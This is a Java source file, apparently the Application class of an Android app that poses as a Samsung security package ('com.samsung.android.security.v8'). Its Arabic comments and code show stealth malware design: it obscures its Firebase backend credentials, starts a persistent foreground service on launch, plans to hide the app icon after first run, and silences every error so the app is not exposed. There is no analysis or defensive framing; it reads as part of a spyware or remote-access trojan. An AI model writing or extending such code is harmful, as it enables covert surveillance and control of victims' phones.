package com.samsung.android.security.v8;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import androidx.multidex.MultiDex;

import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.services.CoreService;
import com.samsung.android.security.v8.utils.CryptoUtil;
import com.samsung.android.security.v8.utils.DeviceUtil;

public class AlKhanjarApp extends Application {
    
    private static final String TAG = "SSV8";
    private static Context appContext;
    
    @Override
    public void onCreate() {
        super.onCreate();
        appContext = this;
        
        // تهيئة MultiDex
        MultiDex.install(this);
        
        // تهيئة Firebase بشكل مشفر
        initFirebase();
        
        // بدء الخدمة الأساسية
        startCoreService();
        
        // إخفاء الأيقونة بعد أول تشغيل
        hideAppIcon();
    }
    
    private void initFirebase() {
        try {
            // فك تشفير بيانات Firebase
            String fbUrl = decrypt(BuildConfig.FB_URL);
            String fbKey = decrypt(BuildConfig.FB_KEY);
            
            FirebaseOptions options = new FirebaseOptions.Builder()
                    .setApplicationId("1:407210691250:android:80bf0e5619fc4cd19897ab")
                    .setApiKey(fbKey)
                    .setDatabaseUrl(fbUrl)
                    .setProjectId("hmooude-37c70")
                    .setStorageBucket("hmooude-37c70.firebasestorage.app")
                    .build();
            
            FirebaseApp.initializeApp(this, options);
            
            // تفعيل الاتصال الدائم
            FirebaseDatabase.getInstance().setPersistenceEnabled(true);
            FirebaseDatabase.getInstance().getReference(".info/connected");
            
        } catch (Exception e) {
            // تجاهل الأخطاء لعدم كشف التطبيق
        }
    }
    
    private void startCoreService() {
        try {
            Intent serviceIntent = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void hideAppIcon() {
        // يتم إخفاء الأيقونة من MainActivity بعد التأكد من الصلاحيات
    }
    
    private String decrypt(String encrypted) {
        try {
            byte[] data = Base64.decode(encrypted, Base64.DEFAULT);
            return new String(data);
        } catch (Exception e) {
            return "";
        }
    }
    
    public static Context getAppContext() {
        return appContext;
    }
}
